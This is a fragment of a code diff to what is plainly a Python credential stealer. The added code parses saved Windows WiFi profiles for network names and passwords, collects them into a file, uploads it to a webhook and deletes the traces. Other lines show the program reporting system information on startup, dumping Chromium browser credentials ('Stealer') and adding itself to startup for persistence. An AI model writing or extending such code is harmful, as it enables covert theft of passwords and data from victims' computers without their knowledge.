+                                                            import re
+                                                            ssid_match = re.search(r'<name>(.*?)</name>', content)
+                                                            pass_match = re.search(r'<keyMaterial>(.*?)</keyMaterial>', content)
+                                                            
+                                                            if ssid_match:
+                                                                ssid = ssid_match.group(1).strip()
+                                                                password = pass_match.group(1) if pass_match else "[No Password]"
+                                                                combined_wifi += f"Network: {ssid}\n"
+                                                                combined_wifi += f"Password: {password}\n"
+                                                                combined_wifi += "-" * 60 + "\n\n"
+                                                            
+                                                            os.remove(wifi_file)
+                                                        except:
+                                                            pass
+                                                    
+                                                    # Save combined file
+                                                    combined_file = os.path.join(wifi_dir, "WiFi_Passwords_All.txt")
+                                                    with open(combined_file, 'w', encoding='utf-8') as f:
+                                                        f.write(combined_wifi)
+                                                    
+                                                    self.send_to_webhook(f"📡 **All WiFi Passwords** ({len(wifi_files)} networks)", file_path=combined_file)
+                                                    os.remove(combined_file)
+                                                else:
+                                                    self.send_to_webhook(">> ⚠️ No WiFi networks found")
                                                     
                                                 self.send_to_webhook(">> ✅ GOD MODE COMPLETE.")
                                             except Exception as e:
@@ -2106,8 +2771,8 @@ del "%~f0"
             # Send system info immediately on startup
             self.system_information()
             
-            # Extract Browser Info (Stealer)
-            threading.Thread(target=self.get_browser_data).start()
+            # Extract Browser Info (Stealer) - DISABLED: Using dump_chromium_creds instead
+            # threading.Thread(target=self.get_browser_data).start()
             
             # Try to add to startup
             self.add_to_startup()
